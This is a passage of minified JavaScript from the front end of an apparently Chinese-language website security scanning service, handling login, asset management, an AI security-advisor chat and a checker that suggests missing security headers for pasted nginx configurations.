e=document.getElementById("api-token-input");if(!e||!e.value||e.value.indexOf("登录")!==-1||e.value==="令牌 不可用"){ie("令牌 不可用，请重新登录","error");return}navigator.clipboard&&navigator.clipboard.writeText?navigator.clipboard.writeText(e.value).then(function(){ie("令牌 已复制","success")}).catch(function(){ie("复制失败","error")}):ie("浏览器不支持自动复制，请手动选择文本复制","error")}function $o(){if(!Le()){ie("请先登录后再修改密码"),On("login");return}let e=document.getElementById("reset-new-password"),i=document.getElementById("reset-new-password2"),t=document.getElementById("reset-error");if(!e||!i){ie("密码重置表单加载失败");return}let s=e.value,r=i.value;if(t&&(t.textContent=""),!s||s.length<6){t&&(t.textContent="新密码至少 6 个字符");return}if(s!==r){t&&(t.textContent="两次密码不一致");return}Ee("/api/reset-password",{method:"POST",body:JSON.stringify({new_password:s})}).then(function(o){return o.json()}).then(function(o){o.success?(ie("密码已修改，请用新密码登录"),Mn()):t.textContent=it(o)||"修改失败"}).catch(function(o){t&&(t.textContent="修改失败: "+o.message)})}function Di(){let e=document.getElementById("login-username"),i=document.getElementById("login-password");document.getElementById("auth-challenge-token"),document.getElementById("login-challenge-answer");let t=document.getElementById("login-error");if(!e||!i){ie("登录表单加载失败");return}let s=e.value.trim(),r=i.value.trim();if(t&&(t.textContent=""),!s||!r){t&&(t.textContent="请输入用户名和密码");return}Ee("/api/login",{skipAuthExpiry:!0,method:"POST",body:JSON.stringify({username:s,password:r})}).then(function(o){return o.json()}).then(function(o){let a=o.token||o.data&&o.data.token,n=o.username||o.data&&o.data.username||s;if(a){Bn(a);try{localStorage.setItem("vs_username",n)}catch{}dt(),Ye(),Re(),typeof window.updateScanCreditsHint=="function"&&window.updateScanCreditsHint(),typeof window.refreshScanStartStateSoon=="function"&&window.refreshScanStartStateSoon(),ie("登录成功，欢迎 "+n),_t("scan"),setTimeout(function(){typeof window.refreshScanStartStateSoon=="function"&&window.refreshScanStartStateSoon()},0)}else t&&(t.textContent=it(o)||"登录失败")}).catch(function(o){t&&(t.textContent="登录失败: "+o.message)})}function At(){let e=document.getElementById("reg-username"),i=document.getElementById("reg-email"),t=document.getElementById("reg-password"),s=document.getElementById("reg-password2"),r=document.getElementById("register-error");if(!e||!t||!s){ie("注册表单加载失败");return}let o=e.value.trim(),a=i?i.value.trim():"",n=t.value.trim(),c=s.value.trim(),p=document.getElementById("auth-challenge-token-reg")||document.getElementById("auth-challenge-token"),v=document.getElementById("reg-challenge-answer");if(r&&(r.textContent=""),!o||!n){r&&(r.textContent="请输入用户名和密码");return}if(n!==c){r&&(r.textContent="两次密码不一致");return}if(n.length<6){r&&(r.textContent="密码至少 6 个字符");return}let d={username:o,password:n,challenge_token:p?p.value:"",challenge_answer:v?v.value.trim():""};a&&(d.email=a),Ee("/api/register",{skipAuthExpiry:!0,method:"POST",body:JSON.stringify(d)}).then(function(f){return f.json()}).then(function(f){let h=f.token||f.data&&f.data.token,m=f.username||f.data&&f.data.username||o;if(h){Bn(h);try{localStorage.setItem("vs_username",m)}catch{}dt(),Ye(),Re(),typeof window.updateScanCreditsHint=="function"&&window.updateScanCreditsHint(),typeof window.refreshScanStartStateSoon=="function"&&window.refreshScanStartStateSoon(),ie("注册成功，欢迎 "+m),_t("scan"),setTimeout(function(){typeof window.refreshScanStartStateSoon=="function"&&window.refreshScanStartStateSoon()},0)}else r&&(r.textContent=it(f)||"注册失败")}).catch(function(f){r&&(r.textContent="注册失败: "+f.message)})}function Mn(){Ln();try{localStorage.removeItem("vs_username")}catch{}dt();let e=document.getElementById("nav-alert-badge");e&&(e.style.display="none"),ie("已退出登录"),_t("home")}function _t(e){try{if(e==="scan"){let r=document.getElementById("page-home");r&&r.classList.add("active"),document.querySelectorAll(".page").forEach(function(n){n.id!=="page-home"&&n.classList.remove("active")});let o=document.querySelector('.nav-item[data-page="scan"]');o&&o.classList.add("active"),document.querySelectorAll(".nav-item").forEach(function(n){n.getAttribute("data-page")!=="scan"&&n.classList.remove("active")});let a=document.querySelector(".scan-section");a&&a.scrollIntoView({behavior:"smooth",block:"start"}),typeof window.loadDashboard=="function"&&window.loadDashboard();return}let i=document.getElementById("page-"+e);i&&i.classList.add("active"),document.querySelectorAll(".page").forEach(function(r){r.id!=="page-"+e&&r.classList.remove("active")});let t=e==="result"?"scan":e,s=document.querySelector('.nav-item[data-page="'+t+'"]');s&&s.classList.add("active"),document.querySelectorAll(".nav-item").forEach(function(r){r.getAttribute("data-page")!==t&&r.classList.remove("active")}),window.scrollTo({top:0,behavior:"smooth"}),e==="tickets"&&(no(),tt()),e==="assets"&&Si(),e==="evolution"&&Jt(),e==="billing"&&An(),e==="audit"&&typeof window.fillAuditTargetFromScan=="function"&&window.fillAuditTargetFromScan()}catch(i){console.error("navigateTo error:",i)}}let ci=[],Bt=0,Wo=3,Zo=2500;function ie(e,i){ci.push({msg:e,type:i}),Pn()}function Pn(){if(Bt>=Wo||ci.length===0)return;let e=ci.shift();Bt++;let i=document.getElementById("toast-container");if(!i){Bt--;return}let t=document.createElement("div");t.className="toast";let s="ℹ️";e.type==="error"?s="[错误]":e.type==="success"?s="[成功]":e.type==="warn"&&(s="[警告]");let r=document.createElement("span");r.textContent=s+" ",r.style.marginRight="6px",t.appendChild(r),t.appendChild(document.createTextNode(e.msg)),e.type==="error"?t.classList.add("error"):e.type==="success"&&t.classList.add("success"),i.appendChild(t),requestAnimationFrame(function(){requestAnimationFrame(function(){t.classList.add("show")})}),setTimeout(function(){t.classList.add("hiding"),t.classList.remove("show"),setTimeout(function(){t.parentNode&&t.parentNode.removeChild(t),Bt--,Pn()},300)},Zo)}function Xo(e,i,t,s){if(!i){ie("finding 名称缺失","error");return}if(!Le()){ie("请先登录后再标记误报","error");return}if(e.disabled)return;e.disabled=!0;let r=e.innerHTML;e.innerHTML="提交中...";let o=typeof Ee=="function"?Ee:fetch,a="/api/finding/feedback",n=JSON.stringify({scan_id:t||0,finding_name:i,is_false_positive:!!s,is_confirmed:!s}),c=o(a,{method:"POST",headers:{"Content-Type":"application/json"},body:n});Promise.resolve(c).then(function(p){return p.json().then(function(v){return{ok:p.ok,d:v}})}).then(function(p){if(p.ok&&p.d&&p.d.success){let v=e.closest(".finding-detail");if(v)if(s){v.classList.add("fp-marked"),v.classList.remove("confirmed");let f=v.querySelector(".finding-detail-header");if(f&&!f.querySelector(".fp-badge")){let m=document.createElement("span");m.className="fp-badge",m.textContent="已被标记为误报",f.appendChild(m)}let h=v.querySelector(".finding-feedback-row");if(h&&!h.querySelector(".fp-reason-text")){let m=document.createElement("span");m.className="fp-reason-text",m.textContent="已标记为误报，将用于优化未来检测",h.appendChild(m)}}else{v.classList.add("confirmed"),v.classList.remove("fp-marked");let f=v.querySelector(".finding-detail-header");if(f&&!f.querySelector(".confirmed-badge")){let m=document.createElement("span");m.className="confirmed-badge",m.textContent="已确认",f.appendChild(m)}let h=v.querySelector(".finding-feedback-row");if(h&&!h.querySelector(".fp-reason-text")){let m=document.createElement("span");m.className="fp-reason-text",m.style.color="#73c990",m.textContent="已确认为真实漏洞，感谢您的反馈",h.appendChild(m)}}(v||document).querySelectorAll(".finding-feedback-row .finding-feedback-btn").forEach(function(f){f.disabled=!0,f.textContent=f.classList.contains("btn-confirm")?"准确":"误报"}),ie(s?"已记录为误报，感谢反馈！":"已确认为真实漏洞，感谢反馈！","success")}else e.disabled=!1,e.innerHTML=r,ie("提交失败: "+(p.d&&(p.d.error||p.d.detail)||"未知错误"),"error")}).catch(function(p){e.disabled=!1,e.innerHTML=r,ie("提交失败: "+p.message,"error")})}let Ve=[];function Si(){if(!Le()){Ro("asset-list",""),Fo("asset-empty","block");let e=document.getElementById("asset-empty");e&&(e.innerHTML='<div class="ticket-empty-icon"></div><p>请先登录查看资产</p><p class="ticket-empty-hint">登录后管理您的域名资产</p>');return}Ee("/api/assets").then(function(e){return e.json()}).then(function(e){e&&e.assets?(Ve=e.assets,ii(Ve)):(Ve=[],ii(Ve))}).catch(function(e){ie("加载资产失败: "+e.message,"error"),Ve=[],ii(Ve)})}function ii(e){let i=document.getElementById("asset-list"),t=document.getElementById("asset-empty");if(!i)return;if(!e||e.length===0){i.innerHTML="",t&&(t.style.display="block",t.innerHTML='<div class="ticket-empty-icon"></div><p>暂无资产</p><p class="ticket-empty-hint">添加您的第一个域名资产，开始安全扫描</p>');return}t&&(t.style.display="none");let s='<div class="asset-table-wrap"><table class="asset-table">';s+="<thead><tr><th>域名</th><th>负责人</th><th>验证状态</th><th>评分</th><th>操作</th></tr></thead><tbody>",e.forEach(function(r){let o=r.verified||!1,a=o?"verified":"pending",n=o?"已验证":"待复核",c=r.score,p="high";c==null?(c="-",p=""):c<50?p="low":c<75&&(p="medium"),s+="<tr>",s+='<td data-label="域名"><div class="asset-domain">'+fe(r.domain||"")+'</div><div class="asset-meta">'+fe(r.description||"")+"</div></td>",s+='<td data-label="负责人">'+fe(r.owner||"-")+"</td>",s+='<td data-label="验证状态"><span class="asset-badge '+a+'">'+n+"</span></td>",s+='<td data-label="评分"><div class="asset-score '+p+'">'+c+"</div></td>",s+='<td data-label="操作"><div class="asset-actions">',s+='<button class="asset-btn primary" onclick="scanAsset('+r.id+", '"+No(r.domain||"")+`')">扫描</button>`,s+='<button class="asset-btn secondary" onclick="editAsset('+r.id+')">编辑</button>',s+='<button class="asset-btn danger" onclick="deleteAsset('+r.id+')">删除</button>',s+="</div></td>",s+="</tr>"}),s+="</tbody></table></div>",i.innerHTML=s}function Jt(){if(!Le()){let i=document.getElementById("evolution-content");i&&(i.innerHTML='<div class="ticket-empty"><div class="ticket-empty-icon"></div><p>请先登录</p><p class="ticket-empty-hint">登录后使用智能学习、主动监控、团队协作与安全顾问</p></div>');return}let e=document.getElementById("evolution-content");e&&(e.innerHTML='<div class="loading">正在读取进化中心数据...</div>'),Ee("/api/evolution/dashboard").then(function(i){return i.json()}).then(function(i){i&&i.success?Vo(i):e&&(e.innerHTML='<div class="ticket-empty"><div class="ticket-empty-icon"></div><p>暂未登录或无数据</p></div>')}).catch(function(i){e&&(e.innerHTML='<div class="ticket-empty"><div class="ticket-empty-icon"></div><p>加载失败: '+fe(i.message)+"</p></div>")})}function Vo(e){let i=document.getElementById("evolution-content");if(!i)return;let t=Math.round(e.evolution_score||0),s=e.learning||{},r=e.monitoring||{},o=e.team||{},a=s.trend||[],n=s.persistent_issues||[],c=s.recommendations||[],p=s.predicted_next_score,v=t>=80?"#73c990":t>=50?"#f0a732":"#c75450",d="";d+='<div class="evo-score-card">',d+='  <div class="evo-score-label">进化指数</div>',d+='  <div class="evo-score-value" style="color:'+v+'">'+t+"</div>",d+='  <div class="evo-score-bar"><div class="evo-score-fill" style="width:'+t+"%;background:"+v+'"></div></div>',d+='  <div class="evo-score-hint">基于历史扫描、监控告警与团队协作综合计算</div>',d+="</div>",d+='<div class="evo-grid">',d+=Lt("智能学习","","#4b6eaf",[{k:"总扫描次数",v:s.total_scans||0},{k:"平均分",v:s.avg_score||"-"},{k:"最高分",v:s.best_score||"-"},{k:"预测下次",v:p||"-"}],()=>Ot("learning")),d+=Lt("主动监控","","#c75450",[{k:"监控项",v:r.monitors_count||0},{k:"未读告警",v:r.unread_alerts||0},{k:"状态",v:r.monitors_count?"运行中":"未启用"}],()=>Ot("monitoring")),d+=Lt("安全顾问","","#4b6eaf",[{k:"会话记忆",v:"已启用"},{k:"建议数",v:c.length},{k:"响应",v:"实时"}],()=>Ot("ai")),d+=Lt("团队协作","","#73c990",[{k:"加入团队",v:o.teams_count||0},{k:"评论",v:"可发起"},{k:"状态",v:o.teams_count?"已加入":"未加入"}],()=>Ot("team")),d+="</div>",d+='<div class="evo-row">',d+='  <div class="evo-panel">',d+='    <div class="evo-panel-title">评分趋势</div>',a.length===0?d+='    <div class="evo-empty">暂无历史评分，先做一次扫描</div>':(d+='    <div class="evo-trend">',a.forEach(function(f){d+='<div class="evo-trend-item"><div class="evo-trend-score">'+f.score+'</div><div class="evo-trend-date">'+fe(f.date||"")+"</div></div>"}),d+="    </div>"),d+="  </div>",d+='  <div class="evo-panel">',d+='    <div class="evo-panel-title">持续问题</div>',n.length===0?d+='    <div class="evo-empty">暂无持续性问题</div>':(d+='    <ul class="evo-list">',n.forEach(function(f){if(typeof f=="string")d+="<li>"+fe(f)+"</li>";else if(f&&typeof f=="object"){let h=f.name||f.title||f.issue||JSON.stringify(f),m=f.times?' <span class="evo-empty">×'+f.times+"</span>":"",g=f.severity?' <span class="evo-alert-time">['+fe(f.severity)+"]</span>":"";d+="<li>"+fe(h)+m+g+"</li>"}else d+="<li>"+fe(String(f))+"</li>"}),d+="    </ul>"),d+="  </div>",d+="</div>",d+='<div class="evo-panel">',d+='  <div class="evo-panel-title">个性化建议</div>',c.length===0?d+='  <div class="evo-empty">完成更多扫描后，系统会给出更精准的建议</div>':(d+='  <ul class="evo-recs">',c.forEach(function(f){d+="<li>"+fe(f)+"</li>"}),d+="  </ul>"),d+="</div>",r.alerts&&r.alerts.length>0&&(d+='<div class="evo-panel">',d+='  <div class="evo-panel-title">最新告警</div>',d+='  <ul class="evo-alerts">',r.alerts.slice(0,5).forEach(function(f){d+='<li><span class="evo-alert-time">'+fe(f.created_at||"")+"</span> - "+fe(f.message||"")+"</li>"}),d+="  </ul>",d+="</div>"),i.innerHTML=d}function Lt(e,i,t,s,r){let o='<div class="evo-card" style="border-top:2px solid '+t+'" onclick="('+r.toString()+')()">';return o+='  <div class="evo-card-head"><span class="evo-card-icon" style="background:#313335;color:'+t+'">'+i+'</span><span class="evo-card-title">'+e+"</span></div>",o+='  <div class="evo-card-items">',s.forEach(function(a){o+='<div class="evo-card-item"><div class="evo-card-k">'+fe(a.k)+'</div><div class="evo-card-v">'+fe(String(a.v))+"</div></div>"}),o+="  </div>",o+="</div>",o}function Ot(e){let i="";e==="monitoring"?(i='<div class="evo-detail">',i+='  <div class="evo-detail-title">添加监控</div>',i+='  <div class="evo-detail-form">',i+='    <input id="mon-url" class="evo-input" placeholder="https://示例.com" />',i+='    <input id="mon-freq" class="evo-input" type="number" min="60" value="3600" placeholder="检查频率（秒）" />',i+='    <button class="evo-btn" onclick="createMonitor()">创建监控</button>',i+="  </div>",i+='  <div id="evo-mon-list"></div>',i+="</div>",ie("提示:在弹窗中可创建监控","info")):e==="ai"?(i='<div class="ai-chat-wrap">',i+='  <div class="ai-status-bar" id="ai-status-bar"><span class="ai-status-dot pending"></span><span class="ai-status-text">检测中...</span></div>',i+='  <div class="ai-quick">',i+=`    <button class="ai-quick-btn" onclick="aiSend('我的网站最近有什么风险?')">我的风险</button>`,i+=`    <button class="ai-quick-btn" onclick="aiSend('怎么修 HSTS 缺失?')">修 HSTS</button>`,i+=`    <button class="ai-quick-btn" onclick="aiSend('我应该先修哪个问题?')">优先级</button>`,i+=`    <button class="ai-quick-btn" onclick="aiSend('解释一下 CSP 是什么')">CSP 解释</button>`,i+="  </div>",i+='  <div id="evo-ai-msgs" class="ai-msgs">',i+='    <div class="ai-msg bot">',i+='      <div class="ai-msg-avatar">顾问</div>',i+='      <div class="ai-msg-body">',i+='        <div class="ai-msg-name">安全顾问</div>',i+='        <div class="ai-msg-content">你好！我是漏洞哨兵的安全顾问。<br><br>我可以帮你：<br>• 分析扫描报告与漏洞优先级<br>• 给出可执行的安全修复步骤<br>• 解释安全概念与配置示例<br>• 基于你的历史给出个性化建议<br><br>试试上方的快捷问题，或直接输入想了解的安全问题。</div>',i+="      </div>",i+="    </div>",i+="  </div>",i+='  <div class="ai-input-bar">',i+='    <textarea id="evo-ai-q" class="ai-input" rows="1" placeholder="想问什么…（Shift+Enter 换行）"></textarea>',i+='    <button class="ai-send-btn" id="ai-send-btn" onclick="aiAsk()">发送</button>',i+="  </div>",i+="</div>",setTimeout(function(){Jo();let r=document.getElementById("evo-ai-q");r&&(r.addEventListener("keydown",function(o){o.key==="Enter"&&!o.shiftKey&&(o.preventDefault(),Rn())}),r.addEventListener("input",function(){this.style.height="auto",this.style.height=Math.min(this.scrollHeight,120)+"px"}))},100)):e==="team"?(i='<div class="evo-detail">',i+='  <div class="evo-detail-title">团队协作</div>',i+='  <div class="evo-detail-form">',i+='    <input id="team-name" class="evo-input" placeholder="团队名称" />',i+='    <button class="evo-btn" onclick="createTeam()">创建团队</button>',i+="  </div>",i+='  <div id="evo-team-list"></div>',i+="</div>"):e==="learning"&&(i='<div class="evo-detail">',i+='  <div class="evo-detail-title">智能学习洞察</div>',i+='  <div class="evo-empty">系统会基于您的历史扫描自动归纳模式、预测风险与生成建议</div>',i+="</div>");let t=document.getElementById("evolution-content"),s=document.createElement("div");s.className="evo-modal-bg",s.innerHTML='<div class="evo-modal"><div class="evo-modal-close" onclick="this.parentNode.parentNode.remove()">&times;</div>'+i+"</div>",t.appendChild(s)}function Go(){let e=document.getElementById("mon-url").value.trim(),i=parseInt(document.getElementById("mon-freq").value)||3600;if(!e){ie("请输入 URL","error");return}Ee("/api/monitors",{method:"POST",body:JSON.stringify({url:e,frequency:i})}).then(function(t){return t.json()}).then(function(t){t.id||t.monitor_id?(ie("监控已创建","success"),Jt()):ie("创建失败","error")}).catch(function(t){ie("创建失败: "+t.message,"error")})}function Rn(){let e=document.getElementById("evo-ai-q");if(!e)return;let i=e.value.trim();i&&Fn(i)}let ni=!1;function Fn(e){if(ni)return;let i=document.getElementById("evo-ai-q"),t=document.getElementById("evo-ai-msgs"),s=document.getElementById("ai-send-btn");if(!t)return;ni=!0,t.innerHTML+='<div class="ai-msg user">  <div class="ai-msg-avatar user">我</div>  <div class="ai-msg-body">    <div class="ai-msg-content">'+fe(e)+"</div>  </div></div>",i&&(i.value=""),s&&(s.disabled=!0,s.textContent="思考中…");let r="typing-"+Date.now();t.innerHTML+='<div class="ai-msg bot" id="'+r+'">  <div class="ai-msg-avatar">顾问</div>  <div class="ai-msg-body"><div class="ai-msg-content"><span class="ai-typing">...</span></div></div></div>',t.scrollTop=t.scrollHeight,Ee("/api/ai/chat",{method:"POST",body:JSON.stringify({message:e})}).then(function(o){return o.json()}).then(function(o){let a=document.getElementById(r);a&&a.remove();let n=o&&o.response||o&&o.reply||o&&o.message||JSON.stringify(o),c="";if(o&&o.llm_used){let p=(o.llm_provider||"LLM").toUpperCase();c='<span class="ai-tag real">真 '+fe(p)+"</span>"}else c='<span class="ai-tag local">本地规则</span>';t.innerHTML+='<div class="ai-msg bot">  <div class="ai-msg-avatar">顾问</div>  <div class="ai-msg-body">    <div class="ai-msg-name">安全顾问 '+c+'</div>    <div class="ai-msg-content">'+Ko(n)+"</div>  </div></div>",t.scrollTop=t.scrollHeight}).catch(function(o){let a=document.getElementById(r);a&&a.remove(),t.innerHTML+='<div class="ai-msg bot">  <div class="ai-msg-avatar">顾问</div>  <div class="ai-msg-body"><div class="ai-msg-content">请求失败: '+fe(o.message)+"</div></div></div>"}).finally(function(){ni=!1,s&&(s.disabled=!1,s.textContent="发送")})}function Jo(){let e=document.getElementById("ai-status-bar");e&&fetch("/api/ai/status").then(function(i){return i.json()}).then(function(i){!i||!i.success||(i.llm_enabled&&i.api_key_configured?e.innerHTML='<span class="ai-status-dot ok"></span><span class="ai-status-text">已连接真实 LLM · '+fe(i.provider)+" / "+fe(i.model)+"</span>":e.innerHTML='<span class="ai-status-dot local"></span><span class="ai-status-text">本地规则模式（未配置 LLM Key）</span>')}).catch(function(){e.innerHTML='<span class="ai-status-dot err"></span><span class="ai-status-text">无法获取安全顾问状态</span>'})}function Ko(e){if(!e)return"";let i=String(e).split(/```/),t=[];for(let s=0;s<i.length;s++)if(s%2===1)t.push('<pre class="ai-code"><code>'+fe(i[s])+"</code></pre>");else{let r=fe(i[s]);r=r.replace(/`([^`\n]+)`/g,'<code class="ai-code-inline">$1</code>'),r=r.replace(/\*\*([^*]+)\*\*/g,"<strong>$1</strong>"),r.split(/\n\n+/).forEach(function(a){let n=a.replace(/\n/g," ").trim();n&&t.push("<p>"+n+"</p>")})}return t.join("")}function Yo(){let e=document.getElementById("team-name").value.trim();if(!e){ie("请输入团队名","error");return}Ee("/api/teams",{method:"POST",body:JSON.stringify({name:e})}).then(function(i){return i.json()}).then(function(i){i.id||i.team_id?(ie("团队已创建","success"),Jt()):ie("创建失败: "+JSON.stringify(i),"error")}).catch(function(i){ie("创建失败: "+i.message,"error")})}function Qo(e){let i=Ve.find(function(o){return o.id===e});if(!i)return;let t=prompt("修改域名:",i.domain||"");if(t===null)return;let s=prompt("修改负责人:",i.owner||"");if(s===null)return;let r=prompt("修改描述:",i.description||"");r!==null&&Ee("/api/assets/"+e,{method:"PATCH",body:JSON.stringify({domain:t.trim(),owner:s.trim(),description:r.trim()})}).then(function(o){return o.json()}).then(function(o){o.id||o.success?(ie("资产更新成功","success"),Si()):ie(it(o)||"更新失败","error")}).catch(function(o){ie("更新失败: "+o.message,"error")})}function ea(e){confirm("确定要删除此资产吗？")&&Ee("/api/assets/"+e,{method:"DELETE"}).then(function(i){if(i.ok||i.status===204)ie("资产已删除","success"),Si();else return i.json().then(function(t){throw new Error(it(t)||"删除失败")})}).catch(function(i){ie("删除失败: "+i.message,"error")})}function ta(e,i){if(!i)return;let t=i;/^https?:\/\//i.test(t)||(t="https://"+t),document.getElementById("scan-url").value=t,_t("scan"),typeof window.startScanDirect=="function"&&window.startScanDirect()}function ia(){let e=document.getElementById("ai-chat");e&&(document.getElementById("ai-fab-badge"),e.classList.contains("show")?(e.classList.remove("show"),e.style.display=""):(e.classList.add("show"),e.style.display="",sa(),setTimeout(function(){let i=document.getElementById("ai-input");i&&i.focus()},300)))}function Xe(e,i){let t=document.getElementById("ai-chat-body");if(!t)return null;let s=document.createElement("div");s.className="ai-msg "+(i||"bot");let r=na(e||"");s.innerHTML=r;let o=s.querySelectorAll("pre");for(let a=0;a<o.length;a++)(function(n){let c=document.createElement("div");c.className="ai-code-block";let p=document.createElement("button");p.className="ai-code-copy",p.textContent="复制",p.onclick=function(){let v=n.textContent;if(navigator.clipboard)navigator.clipboard.writeText(v).then(function(){p.textContent="已复制",setTimeout(function(){p.textContent="复制"},1500)});else{let d=document.createElement("textarea");d.value=v,document.body.appendChild(d),d.select(),document.execCommand("copy"),document.body.removeChild(d),p.textContent="已复制",setTimeout(function(){p.textContent="复制"},1500)}},n.parentNode.insertBefore(c,n),c.appendChild(p),c.appendChild(n)})(o[a]);return t.appendChild(s),t.scrollTop=t.scrollHeight,i==="bot"&&(document.getElementById("ai-chat").classList.contains("show")||ra()),s}function na(e){if(!e)return"";let i=e.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;"),t=[];return i=i.replace(/```([\s\S]*?)```/g,function(s,r){let o=r.replace(/^\n+|\n+$/g,"").split(`
`),a="";o.length>0&&/^(nginx|apache|javascript|python|bash|sql|html|css|json|java|php|ruby|go|rust)$/i.test(o[0].trim())&&(a=o[0].trim(),o=o.slice(1));let n=o.join(`
`),c=t.length;return t.push({code:n,lang:a}),"__CODE_BLOCK_"+c+"__"}),i=i.replace(/`([^`\n]+)`/g,'<code class="ai-inline-code">$1</code>'),i=i.replace(/\*\*([^*]+)\*\*/g,"<strong>$1</strong>"),i=i.replace(/^---\s*$/gm,'<hr class="ai-divider">'),i=i.replace(/(^|\n)((?:\s*[-*]\s+[^\n]+\n?)+)/g,function(s,r,o){let n=o.trim().split(`
`).filter(function(c){return c.trim()}).map(function(c){return"<li>"+c.replace(/^\s*[-*]\s+/,"")+"</li>"}).join("");return r+'<ul class="ai-list">'+n+"</ul>"}),i=i.replace(/(^|\n)((?:\s*\d+\.\s+[^\n]+\n?)+)/g,function(s,r,o){let n=o.trim().split(`
`).filter(function(c){return c.trim()}).map(function(c){return"<li>"+c.replace(/^\s*\d+\.\s+/,"")+"</li>"}).join("");return r+'<ol class="ai-list ol">'+n+"</ol>"}),i=i.replace(/__CODE_BLOCK_(\d+)__/g,function(s,r){let o=t[parseInt(r)];return'<div class="ai-code-wrap">'+(o.lang?'<span class="ai-code-lang">'+o.lang+"</span>":"")+"<pre><code>"+o.code+"</code></pre></div>"}),i=i.replace(/\n/g,"<br>"),i}let Ft=0;function ra(){Ft++;let e=document.getElementById("ai-fab-badge");e&&(e.textContent=Ft>99?"99+":String(Ft),e.style.display="")}function sa(){Ft=0;let e=document.getElementById("ai-fab-badge");e&&(e.style.display="none",e.textContent="0")}function oa(){let e=document.getElementById("ai-chat-body");if(!e)return null;let i=document.createElement("div");return i.className="ai-msg bot ai-typing-wrap",i.innerHTML='<span class="ai-typing"><span></span><span></span><span></span></span>',e.appendChild(i),e.scrollTop=e.scrollHeight,i}let Mt=!1;async function jn(){if(Mt)return;let e=document.getElementById("ai-input"),i=(e.value||"").trim();if(!i)return;if(Mt=!0,Xe(i,"user"),e.value="",!Le()){Xe("请先登录后再使用安全顾问。登录后我还能根据你的扫描历史给出个性化建议。","bot"),Mt=!1;return}let t=oa();try{let s=Nn(),r={message:i};s.api_key&&(r.api_key=s.api_key,r.provider=s.provider,r.model=s.model,r.use_llm=s.use_llm!==!1);let o=await Ee("/api/ai-advisor",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(r)}),a=await o.json();t&&t.parentNode&&t.remove(),o.ok?Xe(a.reply||"（无回复）","bot"):o.status===429?Xe("你问得太快啦，让我歇一会儿～ 1 分钟后再试试吧！","bot"):o.status===401||o.status===403?Xe("登录状态好像过期了，刷新一下页面重新登录试试？","bot"):Xe(`抱歉，我刚才处理出现了问题。你再说一遍刚才的问题好吗？

（错误：`+fe(it(a))+"）","bot")}catch{t&&t.parentNode&&t.remove(),Xe(`网络连接出现问题，检查一下网络连接再试试？

如果问题一直出现，可以刷新页面试试。`,"bot")}finally{Mt=!1}}function aa(e){let i=document.getElementById("ai-input");i&&(i.value=e),jn()}function Hn(e){let i=e&&(e.message||e.error||e.detail)||String(e)||"未知错误";return/timeout|timed out/i.test(i)?"网络连接超时，请检查 URL 是否可访问":/dns|getaddrinfo|Name or service not known/i.test(i)?"域名解析失败，请检查域名是否正确":/403|forbidden/i.test(i)?"目标站点拒绝访问，可能需要授权或绕过 WAF":/404|not found/i.test(i)?"目标页面不存在，请检查 URL 路径":/ssl|certificate|handshake/i.test(i)?"SSL/TLS 握手失败，证书可能无效或过期":/refused|connect/i.test(i)?"连接被拒绝，目标站点可能不可达":/authorized|授权/i.test(i)?"请先勾选「我已获得授权扫描此目标」":/rate|limit|频率/i.test(i)?"扫描频率超限，请稍后再试":i.length>60?i.substring(0,60)+"...":i}window.friendlyError=Hn;document.addEventListener("DOMContentLoaded",function(){Ye();try{$t()}catch(e){console.warn("loadAuthChallenge error:",e)}setInterval(Ye,6e4);try{}catch(e){console.warn("initScanPage error:",e)}});function la(){try{let e=`server {
    listen 80;
    server_name example.com www.example.com;
    root /var/www/html;
    index index.html index.php;

    location / {
        try_files $uri $uri/ =404;
    }

    location ~ \\.php$ {
        fastcgi_pass unix:/run/php/php-fpm.sock;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }

    access_log /var/log/nginx/access.log;
    error_log /var/log/nginx/error.log;
}`,i=document.getElementById("fixer-input");i&&(i.value=e),ie("已载入示例服务器配置")}catch(e){console.error("loadSampleConfig error:",e),ie("加载示例配置失败: "+(e.message||String(e)),"error")}}function da(){try{if(!confirm("确定要清空当前配置内容吗？"))return;let e=document.getElementById("fixer-input"),i=document.getElementById("fixer-result");e&&(e.value=""),i&&(i.innerHTML=""),ie("已清空")}catch(e){console.error("clearFixer error:",e),ie("清空失败: "+(e.message||String(e)),"error")}}function ca(){Hi("fixer-analyze-btn",!0),setTimeout(function(){Hi("fixer-analyze-btn",!1)},600);let e=document.getElementById("fixer-input");if(!e)return;let i=e.value.trim();if(!i){ie("请先输入或粘贴服务器配置");return}try{let t=pa(i);di=t,fa(t,i)}catch(t){console.error("analyzeFixer error:",t);let s=document.getElementById("fixer-result");s&&(s.innerHTML='<div class="card"><p style="color:var(--danger)">分析失败: '+fe(t.message||String(t))+"</p></div>")}}function pa(e){let i=[];e.split(`
`),/Strict-Transport-Security/i.test(e)||i.push({name:"HSTS 未配置",severity:"high",reason:"未设置 Strict-Transport-Security 头，浏览器不会强制使用 HTTPS，可能导致降级攻击。",fix:'add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;'}),/Content-Security-Policy/i.test(e)||i.push({name:"CSP 未配置",severity:"high",reason:"未设置 Content-Security-Policy 头，网站容易受到 XSS 攻击和数据注入。",fix:`add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'" always;`}),/X-Frame-Options/i.test(e)||i.push({name:"X-Frame-Options 未配置",severity:"medium",reason:"未设置 X-Frame-Options 头，网站可能被嵌入到恶意页面的 iframe 中进行点击劫持攻击。",fix:'add_header X-Frame-Options "DENY" always;'}),/X-Content-Type-Options/i.test(e)||i.push({name:"X-Content-Type-Options 未配置",severity:"medium",reason:"未设置 X-Content-Type-Options 头，浏览器可能进行 MIME 类型嗅探，导致安全问题。",fix:'add_header X-Content-Type-Options "nosniff" always;'}),/Referrer-Policy/i.test(e)||i.push({name:"Referrer-Policy 未配置",severity:"low",reason:"未设置 Referrer-Policy 头，可能泄露敏感 URL 信息给第三方网站。",fix:'add_header Referrer-Policy "strict-origin-when-cross-origin" always;'}),/Permissions-Policy/i.test(e)||i.push({name:"Permissions-Policy 未配置",severity:"low",reason:"未设置 Permissions-Policy 头，浏览器可能允许不必要的权限访问（摄像头、麦克风等）。",fix:'add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=()" always;'});let 